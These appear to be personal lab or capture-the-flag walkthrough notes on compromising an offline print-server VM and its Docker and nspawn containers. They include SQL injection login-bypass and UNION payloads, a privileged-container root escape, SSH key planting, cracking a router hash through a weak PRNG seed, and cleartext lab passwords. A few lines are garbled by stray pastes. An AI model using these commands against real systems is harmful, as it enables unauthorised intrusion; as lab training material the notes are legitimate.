# walk-through-notes # fe-2026
- end february 2026
- author Lars Klingsten

##
Your host (macbook)
    └── 192.168.122.39  ←  printserver VM  (the target: root@printserver)
            ├── Docker containers (user@, pamela@) on 172.17.0.x
            └── systemd-nspawn containers:
                    └── root@router  (10.0.42.1 / 10.0.67.1)
                            ├── baby-passes-filters  → port 666
                            ├── caas (Go compiler)   → port 80
                            └── vxlan interface


## 1:shasum, test vm-image integrity
```sh
sha256sum printserver-sha256-224ca178c5add882ea6d5333e47857114b2b4751a7848d2f1af0336bab4674b8.vmdk
#224ca178c5add882ea6d5333e47857114b2b4751a7848d2f1af0336bab4674b8  #224ca178c5add882ea6d5333e47857114b2b4751a7848d2f1af0336bab4674b8.vmdk
# == match
```

## 2:NMAP
```sh
nmap -sV -sC -p- 192.168.122.39 > 01-nmap-output.md

22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
80/tcp   open  http
|_http-title: Vault Login
| http-robots.txt: 1 disallowed entry 
|_/../
2200/tcp open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
2222/tcp open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
5355/tcp open  llmnr?

# note: 3 open ports for ssh
```

## 3:Test ports
```sh
ssh 192.168.122.39              # ssh enabled (userid, password unknown)
ssh -p 2200  192.168.122.39     # ssh enabled (userid, password unknown)
ssh -p 2222  192.168.122.39     # ssh enabled (userid, password unknown)
telnet 192.168.122.39 5355      # connection accepted, unknown protocol
```

## 4:HTTP server 
```sh
wget  http://192.168.122.39            # 02-index.hmtl, developer pamala, 2 
wget  http://192.168.122.39/robots.txt # 03-robots.txt (noting) (ref 01)
wget  http://192.168.122.39/style.css  # 04-style.css (nothing) (ref 02)
wget  http://192.168.122.39/secrets    # 05-req_secrets.txt (unauthorized ->Username/Password Authentication Failed.)
```

 # sql injection
 ```sh
curl -X POST http://192.168.122.39/secrets -d "username=admin' OR '1'='1'--&password=password"
# SSH Credentials
# Username: user
# Password: hunter2

ssh user@192.168.122.39 # passwd: hunter2 -> works, we are connected

ip ad
# -> inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
# -> comments: we are on another network, likely a docker container

## Password
curl -d "username=nulluser' UNION SELECT password FROM users WHERE username='admin'--&password=x" http://192.168.122.39/secrets

# -> sqlite: Scan error on column index 0, name "true": sql/driver: couldn't convert "Ukk7YeKsNG0aW8Dmch4r" into type bool</p>
```
## 6:allow easier access
```sh
# larsk@macbookair-2012 (the host)
ssh-copy-id -i ~/.ssh/id_ed25519 user@192.168.122.39

# remote access (for vm-kali)
/home/larsk/source/fe-2026/scripts/ssh_tunnel.sh

## 5:copy all home dirs (password: hunter2)
```sh
scp -P 22 -r user@192.168.122.39:/home ./vm_home_dir
```

## 7:scrips/network.sh, info gathering
```sh
ssh -p 22 user@192.168.122.39 'bash -s' < ./scripts/network.sh > ./vm_network/network.md
```

## 8:scrips/common_ports, info gathering
```sh
HOST=172.17.0.1
echo "commonports on host=$HOST"
for port in 22 80 443 2200 2222 2375 2376 5355 8080 3000 5000 9000; do
  nc -zv -w 1 $HOST $port 2>&1
done
```
Output
  Connection to 172.17.0.1 22 port [tcp/ssh] succeeded!
  Connection to 172.17.0.1 2222 port [tcp/*] succeeded!
  Connection to 172.17.0.1 2376 port [tcp/*] succeeded!
  Connection to 172.17.0.1 5355 port [tcp/*] succeeded!

Comments
  - Port 2376 - open (Docker TLS API!)

## 9:Docker daemon TLS port
-> its a dead-end

```sh
curl -v --connect-timeout 5 https://172.17.0.1:2376/version 2>&1
```
Output:
  ALPN: curl offers h2,http/1.1
  * TLSv1.3 (OUT), TLS handshake, Client hello (1):
  *  CAfile: /etc/ssl/certs/ca-certificates.crt

## lets get the certs
```sh
find / -name "*.pem" 2>/dev/null | grep -v "/proc\|/sys" | head -30
/usr/lib/ssl/cert.pem
/home/user/hostconf/ca.pem
```

## create certs, using standard python3 libs
- this fails, dead-end
```sh
# run scripts/generate_python_weak_script.sh
# copy key_in_text.txt to ~/hostconf
# test the cert with

curl --cert ./cert.pem --key ./key.pem --cacert ./ca.pem https://172.17.0.1:2376/version2376/versionostconf$ curl --cert ./cert.pem --key ./key.pem --cacert ./ca.pem https:/
# -> fails

curl -k --cert ./cert.pem --key ./key.pem https://172.17.0.1:2376/version
# > fails

# bring back the the original ca.pem certs
scp ~/source/fe-2026/home/user/hostconf/ca.pem user@192.168.122.39:/home/user/hostconf/ca.pem.original

# Then in the container, replace the current ca.pem:
mv ca.pem ca.pem.new
mv ca.pem.original ca.pem

```
## copy logs 
scp -P 22 -r user@192.168.122.39:/tmp/*.log ~/home/larsk~/source/fe-2026/vm_192.168.122.39/tmp

## Getting pamela password
- see password_crack_pamela.md

## pamela@1ee55c34929d (random docker id), Ip adr 10.17.0.2
```sh
# login with pwd=2VWxyz|22|zyxWV2
ssh pamela@192.168.122.39 -p 22    #
ssh pamela@192.168.122.39 -p 2200  # does not work
ssh pamela@192.168.122.39 -p 2222  # does not work
# -> port 22 is again just the docker

# easy login (note: only to this offline vm exercice) 
ssh-copy-id -i ~/.ssh/id_ed25519 -p 22  pamela@192.168.122.39

# which network
ip -4 addr | grep -E '172\.17|10\.0|192\.168'
# -> 172.17.0.2

#copy pamela home dir
scp -P 22 -r pamela@192.168.122.39:/home/pamela ~/source/fe-2026/home/
```

---

## from pamela -> root@hostcontainer
- ip adr 10.17.0.2 -> 10.0.17.1
- escape from pamala -> root@dockerhost

```sh
id # as pamala@
```
output
  uid=1001(pamela) gid=1001(pamela) groups=1001(pamela),100(users),103(docker),1337(pwpolicy)

note:
  pamala is part of the 'docker' group

## escape from pamela to root, via docker
```sh
docker run --rm -it --privileged --pid=host --net=host -v /:/host alpine chroot /host bash
whoami
id
```
output:
  root@hostcontainer:~$
  root
  uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)

## @ root@hostcontainer

```sh
ss -tunlp | grep -E ':22|:2200|:2222|:20022|:22222|:80|:8080'
```
output
  tcp   LISTEN 0      128                  0.0.0.0:2222       0.0.0.0:*    users:(("sshd",pid=102,fd=6))
  tcp   LISTEN 0      4096                 0.0.0.0:22         0.0.0.0:*    users:(("docker-proxy",pid=302,fd=4))
  tcp   LISTEN 0      128                     [::]:2222          [::]:*    users:(("sshd",pid=102,fd=7))
  tcp   LISTEN 0      4096                    [::]:22            [::]:*    users:(("docker-proxy",pid=307,fd=4))

Note:
  open ports 22, 2222. 
  closed 80, 2200 (unlisted)
 
## login directly as root@hostcontainer
- login without password,
- add ssh keys to root@hostcontainer (cd ~/.ssh) 

Instruction:
  copy ~/.ssh/id_ed25519.pub (on your host) to ~/.ssh/authorized_host

```sh
# direct login as root now possble via port 2222
ssh root@192.168.122.39 -p 2222 
```

### root@hostcontainer -> golang server
- its possible to compile go code on the server, and return the binary
- it not possible to execute such code on the server

```sh
nmap -Pn -p 22,80,443,5355 10.0.42.0/24 # services known to be available from earlier scan
```

output:
  Nmap scan report for router (10.0.42.1)

  PORT     STATE  SERVICE
  22/tcp   open   ssh
  80/tcp   open   http
  443/tcp  closed https
  5355/tcp open   llmnr
  MAC Address: 3E:FD:C2:CB:EE:BF (Unknown)

  Nmap scan report for hostcontainer (10.0.42.94)

  PORT     STATE    SERVICE
  22/tcp   filtered ssh
  80/tcp   closed   http
  443/tcp  closed   https
  5355/tcp open     llmnr


## root@hostdocker (caas, compiler as a service, go server)
- Core Service,
- ref ~/home/larsk~/source/hacking/fe-2026/home/user/network.md

```sh
curl -i -X OPTIONS http://10.0.42.1
for m in GET POST PUT DELETE PATCH HEAD OPTIONS; do
  echo "== $m ==";
  curl -i -X $m http://10.0.42.1;
done
```

Output: (GET, DELETE, PATCH -> HTTP/1.1 405 Method Not Allowed)
  == POST ==
  HTTP/1.1 400 Bad Request
  Content-Type: text/plain; charset=utf-8
  X-Content-Type-Options: nosniff
  Date: Sun, 22 Feb 2026 09:46:59 GMT
  Content-Length: 57

  caas-1167672054.go:1:1: expected 'package', found 'EOF'

Comments:
  - appears to be accept 'golang' source code in the req body

## root@hostcontainer
- test sample go code

```sh
curl -i -X POST http://10.0.42.1 \
  --data-binary $'package main\n\nfunc main() {}\n'
```

Output
  HTTP/1.1 200 OK
  Date: Sun, 22 Feb 2026 09:55:05 GMT
  Content-Type: application/octet-stream
  Transfer-Encoding: chunked

  Warning: Binary output can mess up your terminal. Use "--output -" to tell curl
  Warning: to output it to your terminal anyway, or consider "--output <FILE>" to
  Warning: save to a file.
  
  
## root@hostcontainer
- lets test if the compiler does work
```go
// insert into file main.go
package main
import "fmt"
func main() { fmt.Println("compiled! Hello") }
```

```sh
curl -X POST http://10.0.42.1  --output hello  --data-binary @main.go
curl -X POST http://10.0.42.1  --output hello  --data-binary @main_err.go
chmod +ux hello
ls -alh
```
output
  -rwxr-xr-x 1 root root 2.2M Feb 22 10:10 hello
  -rw-r--r-- 1 root root   79 Feb 22 10:10 main.go

```sh
./hello
```
output:
  compiled! Hello

---

## root@hostcontainer -> ~/git/ [bpf]
```sh
cd  ~/source/hacking/fe-2026/home/root@hostcontainer
scp -P 2222 -r root@192.168.122.39:~/git .

```
  └── git
      ├── bpf
      │   └── baby-passes-filters
      ├── pwgen
      │   ├── passwdGen.py
      │   └── router-shadow.bak
      └── pwn1
          ├── main
          ├── main.c
          ├── main@.service
          ├── main.socket
          └── Makefile

Post-Exploitation Note: Router Root Compromise

AI Analyzed passwdGen.py and identified a Low-Entropy PRNG vulnerability. By using only a 3-byte seed (os.urandom(3)), the total password space was capped at 16,777,216 possibilities. The use of a Linear Congruential Generator (LCG) made the password sequence entirely deterministic once the seed was known.

* Hash Identification
Extracted the root hash from router-shadow.bak. The prefix $y$ confirmed the use of yescrypt, a modern, memory-hard Key Derivation Function (KDF) designed to resist GPU/ASIC cracking. 
- unable to crack it with john as "yescrypt" unsupported
- unable to crack it with hashcat, as yescrypt appeared unsupported

* Tooling & Environment
Overcame library deprecation issues in Python 3.13 by using ctypes to link directly to the system's C library (libcrypt.so.1). This allowed for native-speed yescrypt verification without external Python dependencies.

* Parallel Execution
AI Implemented a multi-core brute-force script using ProcessPoolExecutor. By splitting the seed range into chunks, we utilized all available CPU cores, turning a multi-hour task into a much faster search.

* Extraction & Login
Cleartext Password: X@@z:jO:0C/>T;wD

Action: Successfully authenticated via SSH/Terminal as root@router.

---

## root@router
```sh

ssh-copy-id -p 22 -i ~/.ssh/id_ed25519 router # easy login
```
### information
```sh
 ping 10.0.42.1 # access: 64 bytes from 10.0.42.1: icmp_seq=1 ttl=64 time=0.308 ms
```

```sh
ip -4 add
```
output

  2: vb-router0@if6: 
     default qlen 1000       inet 10.0.67.1/24 brd 10.0.67.255 scope global vb-router0
  3: vb-router1@if7: 
    default qlen 1000     inet 10.0.42.1/24 brd 10.0.42.255 scope global vb-router1
  
```sh
ip -4 route
```
output:
  10.0.42.0/24 dev vb-router1 proto kernel scope link src 10.0.42.1
  10.0.67.0/24 dev vb-router0 proto kernel scope link src 10.0.67.1


```sh
ip neighbor show
```
output:
  10.0.67.110 dev vb-router0 lladdr 06:00:52:f6:f8:ab STALE
  10.0.67.199 dev vb-router0 lladdr 2e:1c:30:bd:34:7e STALE
  10.0.67.102 dev vb-router0 lladdr fe:83:d4:69:d7:80 STALE
  10.0.42.94 dev vb-router1 lladdr 4e:a9:d0:48:af:5d DELAY

```sh
ss -tlnp
```
output:
State   Recv-Q  Send-Q   Local Address:Port     Peer Address:Port  Process
LISTEN  0       10             0.0.0.0:666           0.0.0.0:*      users:(("baby-passes-fil",pid=77,fd=4))
LISTEN  0       4096     127.0.0.53%lo:53            0.0.0.0:*      users:(("systemd-resolve",pid=41,fd=20))
LISTEN  0       4096        127.0.0.54:53            0.0.0.0:*      users:(("systemd-resolve",pid=41,fd=22))
LISTEN  0       4096           0.0.0.0:5355          0.0.0.0:*      users:(("systemd-resolve",pid=41,fd=12))
LISTEN  0       4096                 *:55                  *:*      users:(("systemd",pid=1,fd=45))
LISTEN  0       4096                 *:22                  *:*      users:(("sshd",pid=103,fd=3),("systemd",pid=1,fd=49))
LISTEN  0       4096                 *:80                  *:*      users:(("caas",pid=78,fd=3))
LISTEN  0       4096              [::]:5355             [::]:*      users:(("systemd-resolve",pid=41,fd=14))

### Go server (caas), revised
- its running here
- file location root@router:/opt/caas#

```sh
ls -la /proc/78/exe
```
output:
  lrwxrwxrwx 1 caas caas 0 Feb 22 14:30 /proc/78/exe -> /opt/caas/caas

```sh
curl -i -X POST http://localhost \
  --data-binary $'package main\n\nfunc main() {}\n'
```
output:
  HTTP/1.1 200 OK

## file caas, main functions 
```sh
FILE=/opt/caas/caas
nm $FILE | grep " T " | grep "main\."
```
Output:
  000000000061fa80 T main.compileHandler
  0000000000620160 T main.compileHandler.deferwrap1
  000000000061f9a0 T main.main
  000000000046bbe0 T runtime.main.func1
  000000000043e6a0 T runtime.main.func2

```sh
strings /opt/caas/caas | grep -A 5 -B 5 "go build"
```


## Running services
```sh
systemctl list-units --type=service --state=running
```
 Output
    UNIT                        LOAD   ACTIVE SUB     DESCRIPTION
    baby-passes-filters.service loaded active running evil
    caas.service                loaded active running Compiler as a Service
    console-getty.service       loaded active running Console Getty
    cron.service                loaded active running Regular background program processing daemon
    dbus.service                loaded active running D-Bus System Message Bus
    ssh.service                 loaded active running OpenBSD Secure Shell server
    systemd-journald.service    loaded active running Journal Service
    systemd-logind.service      loaded active running User Login Management
    systemd-networkd.service    loaded active running Network Configuration
    systemd-resolved.service    loaded active running Network Name Resolution
    user@0.service              loaded active running User Manager for UID 0


## Jump to the printserver
```sh
df -h # [ε] root@router:/opt/caas#
```
output 
  Filesystem        Size  Used Avail Use% Mounted on
  overlay           8.7G  4.2G  4.1G  52% /
  tmpfs             198M   33M  165M  17% /tmp
  tmpfs             4.0M     0  4.0M   0% /sys
  tmpfs             4.0M     0  4.0M   0% /dev
  tmpfs             198M     0  198M   0% /dev/shm
  tmpfs             395M  136K  395M   1% /run
  /dev/mapper/disk  8.7G  4.2G  4.1G  52% /run/host/os-release
  tmpfs             4.0M     0  4.0M   0% /run/host/unix-export
  tmpfs             198M  732K  197M   1% /run/host/incoming
  tmpfs             1.0M     0  1.0M   0% /run/credentials/systemd-journald.service
  tmpfs             5.0M     0  5.0M   0% /run/lock
  tmpfs             1.0M     0  1.0M   0% /run/credentials/systemd-resolved.service
  tmpfs             1.0M     0  1.0M   0% /run/credentials/systemd-networkd.service
  tmpfs             1.0M     0  1.0M   0% /run/credentials/console-getty.service
  tmpfs             198M  4.0K  198M   1% /run/user/0

Comment:
  /dev/mapper/disk  8.7G  4.2G  4.1G  52% /run/host/os-release
  -> appears to be mirror of the host machine

```sh
ls -alh /run/host  #[ε] root@router:/run/host# 
```
output:
  total 12K
  drwxr-xr-x  5 root root 180 Feb 22 08:57 .
  drwxr-xr-x 15 root root 440 Feb 23 08:35 ..
  -r--r--r--  1 root root  15 Feb 22 08:57 container-manager
  -r--r--r--  1 root root  37 Feb 22 08:57 container-uuid
  dr-xr-xr-x  3 root root 160 Feb 22 08:57 inaccessible
  drw-------  2 root root  40 Feb 22 08:57 incoming
  s-w-------  1 root root   0 Feb 22 08:57 notify
  -rw-r--r--  1 root root 286 Jan  2 12:35 os-release
  drwxr-xr-x  2 root root  60 Feb 22 08:57 unix-export

```sh
cat /run/host/os-release # root@router:/run/host# 
```
output:
  PRETTY_NAME="Debian GNU/Linux 13 (trixie)"
  DEBIAN_VERSION_FULL=13.3

```sh
  ls -la /run/host/unix-export
  nc -U /run/host/unix-export/ssh
  ```
output:
  srw-rw-rw- 1 root root   0 Feb 22 08:57 ssh
  SSH-2.0-OpenSSH_10.0p2 Debian-7

```sh
# login to print-server
  ssh -i /root/.ssh/id_ed25519  -o "ProxyCommand=nc -U /run/host/unix-export/ssh" -o "StrictHostKeyChecking=no"     root@printserver
```
output:
  root@router:~#

Comments:
  appears to remain on root@router (not root@printserver)

```sh
uname -a &&  hostname  # at root@router and also at root@router (but the printserver)
```
output:
  Linux router 6.12.63+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.63-1 (2025-12-30) x86_64 GNU/Linux
  router

comments: identical for both system


### prove that we did jump to print server
```sh
# jump to the print-server
ssh -i /root/.ssh/id_ed25519  -o "ProxyCommand=nc -U /run/host/unix-export/ssh" -o "StrictHostKeyChecking=no"     root@printserver

# root@router:~#  -> now @ printserver
ps aux | wc -l 
# -> 37
exit # [ε] root@router:~#
logout
Connection to printserver closed.

# run the command again -> now @ router
[ε] root@router:~# ps aux | wc -l
31
```
comments:
  you are elevated to the print-server, howver the file system are not identical


## lets use the go server
```go
// hello.go
package main
import "fmt"
func main() { fmt.Println("compiled! Hello") }
```


```go
// probe.go
// v1
package main

import (
	"fmt"
	"os"
)

func main() {
	fmt.Println("--- Starting Host Probe ---")
	
	paths := []string{
		"/run/host/unix-export/ssh",
		"/run/host/container-manager",
		"/var/run/docker.sock",
		"/run/docker.sock",
	}

	for _, p := range paths {
		if info, err := os.Stat(p); err == nil {
			fmt.Printf("[+] Found %s (Mode: %s)\n", p, info.Mode())
		} else {
			fmt.Printf("[-] Missing %s\n", p)
		}
	}

	fmt.Println("\n--- /run/host/ Directory ---")
	files, _ := os.ReadDir("/run/host")
	for _, f := range files {
		fmt.Printf(" - %s\n", f.Name())
	}
}
```

```sh
curl -X POST localhost  --output hello  --data-binary @hello.go # test simple program
curl -X POST localhost  --output probe  --data-binary @probe.go

chmod +x && ./probe
```
Output:
  --- Starting Host Probe ---
  [+] Found /run/host/unix-export/ssh (Mode: Srw-rw-rw-)
  [+] Found /run/host/container-manager (Mode: -r--r--r--)
  [-] Missing /var/run/docker.sock
  [-] Missing /run/docker.sock

  --- /run/host/ Directory ---
  - container-manager
  - container-uuid
  - inaccessible
  - incoming
  - notify
  - os-release
  - unix-export

```sh
cat /run/host/container-manager
```
Output:
  systemd-nspawn

### Sniff
- appears to have no real usage

```go
//sniff.go
package main

import (
	"fmt"
	"os"
)

func main() {
    // Let's see what type of file 'notify' actually is
	info, err := os.Stat("/run/host/notify")
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	fmt.Printf("Notify file mode: %s\n", info.Mode())
    
    // If it's a regular file, read it
    if info.Mode().IsRegular() {
        content, _ := os.ReadFile("/run/host/notify")
        fmt.Printf("Content: %s\n", string(content))
    }
}
```

```sh
curl -X POST localhost  --output sniff  --data-binary @sniff.go
```
output:
  Notify file mode: S-w-------

---

### Evil service
```sh
systemctl list-units --type=service --state=running
```
Output
    UNIT                        LOAD   ACTIVE SUB     DESCRIPTION
    baby-passes-filters.service loaded active running evil
    caas.service                loaded active running Compiler as a Service
    console-getty.service       loaded active running Console Getty

```sh
systemctl cat baby-passes-filters.service
```
  output:
  #/usr/lib/systemd/system/baby-passes-filters.service
  [Unit]
  Description=evil

  [Service]
  ExecStart=/usr/bin/baby-passes-filters
  User=root

  [Install]
  WantedBy=multi-user.target
  [ε] root@router:~# systemctl cat baby-passes-filters.service
  #/usr/lib/systemd/system/baby-passes-filters.service
  [Unit]
  Description=evil

  [Service]
  ExecStart=/usr/bin/baby-passes-filters
  User=root

  [Install]
  WantedBy=multi-user.target

```go
// memdumb.go
package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

func main() {
	// Find the PID of the evil service
  // curl -X POST localhost  --output memdumb  --data-binary @memdumb.go
	out, _ := exec.Command("pgrep", "baby-passes").Output()
	pid := strings.TrimSpace(string(out))
	if pid == "" {
		fmt.Println("Process not found")
		return
	}

	// Read the memory maps to find where the data is
	maps, _ := os.ReadFile(fmt.Sprintf("/proc/%s/maps", pid))
	fmt.Println("--- Memory Maps ---")
	fmt.Println(string(maps))
    
    // Check if we can read the stack or heap for potential passwords

}
```
```sh
strings /usr/bin/baby-passes-filters
```
Output:
  /lib64/ld-linux-x86-64.so.2
  epoll_ctl
  setsockopt
  free
  exit
  fcntl
  bind
  htons
  socket
  fork
  read
  epoll_wait
  dup2
  recv
  execve
  malloc
  __libc_start_main
  listen
  epoll_create
  __cxa_finalize
  accept
  memset
  close
  waitpid
  __errno_location
  libc.so.6
  GLIBC_2.3.2
  GLIBC_2.34
  GLIBC_2.2.5
  _ITM_deregisterTMCloneTable
  __gmon_start__
  _ITM_registerTMCloneTable
  PTE1
  u+UH
  /bin/sh
  ;*3$"
  GCC: (Debian 14.2.0-19) 14.2.0
  .shstrtab
  .note.gnu.property
  .note.gnu.build-id
  .interp
  .gnu.hash
  .dynsym
  .dynstr
  .gnu.version
  .gnu.version_r
  .rela.dyn
  .rela.plt
  .init
  .plt.got
  .text
  .fini
  .rodata
  .eh_frame_hdr
  .eh_frame
  .note.ABI-tag
  .init_array
  .fini_array
  .dynamic
  .got.plt
  .data
  .bss
  .comment
  [ε] root@router:~#


### find magic string "PTE1"
```sh
objdump -s -j .rodata /usr/bin/baby-passes-filters | grep "PTE1"
objdump -s -j .rodata /usr/bin/baby-passes-filters | grep "PTE1"
objdump -s /usr/bin/baby-passes-filters | grep -C 2 "PTE1"

strings /usr/bin/baby-passes-filters | grep "PTE1"
# output -> PTE1

grep -obU "PTE1" /usr/bin/baby-passes-filters
# output -> grep: /usr/bin/baby-passes-filters: binary file matches
# commentss: but does not say whereype vxlan id 28214 remote 192.168.153.241 dstport 4789
$ sudo dhclient vxlan

strings -t x /usr/bin/baby-passes-filters | grep "PTE1"
#output ->  11ad PTE1

od -A x -t x1z -j 0x11ad -N 32 /usr/bin/baby-passes-filters
```
output
  0011ad 50 54 45 31 c0 31 c9 48 8d 3d ce 00 00 00 ff 15  >PTE1.1.H.=......<
  0011bd ff 2d 00 00 f4 66 2e 0f 1f 84 00 00 00 00 00 0f  >.-...f..........<
  0011cd

comments (AI):
  This od output is a massive breakthrough. It confirms that PTE1 is not just a string—it is Shellcode.

  Look at the bytes immediately following PTE1 (starting at 0011b1):
  c0 31 (which is xor al, al or similar)
  c9 31 (which is xor ecx, ecx)
  48 8d 3d (which is lea rdi, [rip + offset])

  The fact that PTE1 is physically touching machine code (31 c0, 31 c9) at such a low address (0x11ad) suggests this is the entry point or a stub for the "Evil" logic.

---

### vpn@printserver
```sh
cat connect.sh # [ε] root@router:~/git/vpn# 
```
output:
  #!/bin/bash
  sshpass -p "smirk_september_procedure_washer" ssh -p 2200 vpn@printserver
```sh
ssh vpn@printserver -p 2200
```
comments:
  logged in

---

### ~/git/wat @ root@router:
```sh
cd ~/git/wat
ls -R
```
Output:
  build-nodejs.sh  libnode115_20.19.2+dfsg-1_amd64.deb  site  v8.patch

  ./site:
  public	public.js  rollup.config.js  server.js

  ./site/public:
  index.html  libwabt.js

 
### exact node, and run the nodejs service
```sh
cd ~/git/wat
dpkg -i libnode115_20.19.2+dfsg-1_amd64.deb
```
comments:
  fails to compile, to internet required for apt

### the hunt for nodejs a server
```sh
find /usr/bin /usr/sbin /bin -type f -exec grep -l "libnode.so.115" {} + 2>/dev/null
find /opt /srv -executable -type f 2>/dev/null

/opt/caas/caas site/server.js &

strings /opt/caas/caas | grep golang
```
output:
  vendor/golang.org/x/sys/cpu
  vendor/golang.org/x/net/idna
  #vendor/golang.org/x/net/http2/hpack
  [...]

Comments:
  is a go server